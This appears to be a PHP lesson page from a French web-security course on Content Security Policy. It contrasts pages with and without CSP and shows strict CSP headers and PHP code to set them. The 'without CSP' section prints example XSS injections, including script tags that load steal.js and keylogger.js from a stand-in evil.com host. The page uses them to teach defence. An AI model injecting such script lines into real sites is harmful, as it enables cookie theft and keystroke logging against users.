<?php include __DIR__ . '/../../../includes/header.php'; ?>

<div class="page-header">
    <h2>Ch1 — Ex4 : Configuration CSP</h2>
    <p>Content Security Policy : restreindre les sources de contenu pour bloquer les injections.</p>
    <span class="duration">20 min</span>
</div>

<div class="card">
    <div class="tabs">
        <button class="tab active" data-tab="vuln">Sans CSP</button>
        <button class="tab secure" data-tab="secure">Avec CSP</button>
    </div>

    <!-- SANS CSP -->
    <div id="vuln" class="tab-content active">
        <div class="alert alert-danger">
            SANS CSP : Le navigateur accepte les scripts de n'importe quelle source.
        </div>

        <h3>Qu'est-ce que la CSP ?</h3>
        <div class="explanation">
            <h4>Définition</h4>
            <p>La <strong>Content Security Policy</strong> est un en-tête HTTP qui indique au navigateur quelles sources de contenu (scripts, styles, images, etc.) sont autorisées. C'est une <strong>deuxième ligne de défense</strong> contre les XSS.</p>
        </div>

        <h4 style="margin-top:20px;">Sans CSP, tout est permis</h4>
        <div class="code-block">
<span class="comment">&lt;!-- Sans CSP, le navigateur exécute tout ce qu'il trouve --&gt;</span>

<span class="vulnerable">&lt;!-- Script inline → exécuté --&gt;
&lt;script&gt;alert('XSS')&lt;/script&gt;</span>

<span class="vulnerable">&lt;!-- Script depuis un serveur externe → exécuté --&gt;
&lt;script src="https://evil.com/steal.js"&gt;&lt;/script&gt;</span>

<span class="vulnerable">&lt;!-- Image depuis n'importe où → chargée --&gt;
&lt;img src="https://evil.com/track.gif"&gt;</span>

<span class="vulnerable">&lt;!-- Style inline → appliqué --&gt;
&lt;style&gt;body { display:none !important; }&lt;/style&gt;</span>
        </div>

        <h4 style="margin-top:20px;">Scénario d'attaque</h4>
        <p>Si un attaquant réussit une injection XSS (même minime), il peut charger un script externe complet :</p>
        <div class="code-block">
<span class="comment">// L'attaquant injecte juste cette ligne :</span>
<span class="vulnerable">&lt;script src="https://evil.com/keylogger.js"&gt;&lt;/script&gt;</span>

<span class="comment">// keylogger.js fait 500 lignes et :
// - enregistre toutes les frappes clavier
// - vole les cookies
// - modifie les formulaires (phishing)
// - mine de la cryptomonnaie</span>
        </div>
    </div>

    <!-- AVEC CSP -->
    <div id="secure" class="tab-content">
        <div class="alert alert-success">
            AVEC CSP : Le navigateur bloque tout ce qui n'est pas explicitement autorisé.
        </div>

        <h3>Directives CSP principales</h3>
        <table>
            <tr><th>Directive</th><th>Contrôle</th><th>Exemple</th></tr>
            <tr>
                <td><code>default-src</code></td>
                <td>Source par défaut pour tout</td>
                <td><code>'self'</code></td>
            </tr>
            <tr>
                <td><code>script-src</code></td>
                <td>Sources de JavaScript</td>
                <td><code>'self' cdn.jsdelivr.net</code></td>
            </tr>
            <tr>
                <td><code>style-src</code></td>
                <td>Sources de CSS</td>
                <td><code>'self' 'unsafe-inline'</code></td>
            </tr>
            <tr>
                <td><code>img-src</code></td>
                <td>Sources d'images</td>
                <td><code>'self' data: https:</code></td>
            </tr>
            <tr>
                <td><code>connect-src</code></td>
                <td>URLs pour fetch/XHR</td>
                <td><code>'self' api.example.com</code></td>
            </tr>
            <tr>
                <td><code>frame-ancestors</code></td>
                <td>Qui peut intégrer en iframe</td>
                <td><code>'none'</code></td>
            </tr>
        </table>

        <hr style="margin:20px 0;">

        <h3>Exemples de CSP</h3>

        <h4>CSP stricte (recommandée)</h4>
        <div class="code-block">
<span class="secure">Content-Security-Policy:
  default-src 'self';
  script-src 'self';
  style-src 'self';
  img-src 'self' data:;
  frame-ancestors 'none';</span>

<span class="comment">// Effet :
// ✅ Scripts chargés depuis notre serveur
// ❌ Scripts inline (&lt;script&gt;alert()&lt;/script&gt;) → BLOQUÉ
// ❌ Scripts externes (evil.com/steal.js) → BLOQUÉ
// ❌ Mise en iframe → BLOQUÉ</span>
        </div>

        <h4 style="margin-top:15px;">CSP avec CDN autorisé</h4>
        <div class="code-block">
<span class="secure">Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://cdn.jsdelivr.net;
  style-src 'self' https://cdn.jsdelivr.net 'unsafe-inline';
  img-src 'self' data: https:;
  font-src 'self' https://fonts.gstatic.com;</span>
        </div>

        <h4 style="margin-top:15px;">Implémentation PHP</h4>
        <div class="code-block">
<span class="comment">// Dans votre application PHP</span>
<span class="secure">header("Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; frame-ancestors 'none'");</span>

<span class="comment">// Mode rapport uniquement (ne bloque pas, juste signale)</span>
<span class="secure">header("Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report");</span>
        </div>

        <hr style="margin:20px 0;">

        <h3>Démonstration : XSS bloqué par CSP</h3>
        <div class="code-block">
<span class="comment">// Avec CSP: script-src 'self'</span>
<span class="comment">// Un XSS injecté sera BLOQUÉ par le navigateur :</span>

<span class="vulnerable">// Injection : &lt;script&gt;alert('XSS')&lt;/script&gt;</span>
<span class="secure">// Console : Refused to execute inline script because
// it violates the following Content Security Policy
// directive: "script-src 'self'".</span>

<span class="comment">// Même si le code vulnérable affiche le script,
// le NAVIGATEUR refuse de l'exécuter !</span>
        </div>

        <div class="explanation" style="margin-top:15px;">
            <h4>CSP = filet de sécurité</h4>
            <p>La CSP ne remplace pas l'échappement HTML (htmlspecialchars). C'est une <strong>couche de défense supplémentaire</strong>. Si un XSS passe malgré l'échappement (ex: contexte JavaScript), la CSP le bloquera.</p>
        </div>
    </div>
</div>

<div class="card">
    <h3>Exercice pratique</h3>
    <ol style="margin:10px 0 0 20px;">
        <li>Ouvrez les <strong>DevTools</strong> (F12) → onglet <strong>Console</strong></li>
        <li>Allez dans l'onglet <strong>Réseau (Network)</strong> et cliquez sur une requête</li>
        <li>Regardez les <strong>Response Headers</strong> : y a-t-il un en-tête <code>Content-Security-Policy</code> ?</li>
        <li>Si non, il n'y a pas de CSP → tout script injecté s'exécuterait</li>
        <li><strong>Défi :</strong> Ajoutez <code>header("Content-Security-Policy: default-src 'self'");</code> dans <code>header.php</code> et observez l'effet sur l'exercice XSS</li>
    </ol>
</div>

<a href="index.php" class="btn btn-primary">← Retour au chapitre 1</a>

<?php include __DIR__ . '/../../../includes/footer.php'; ?>
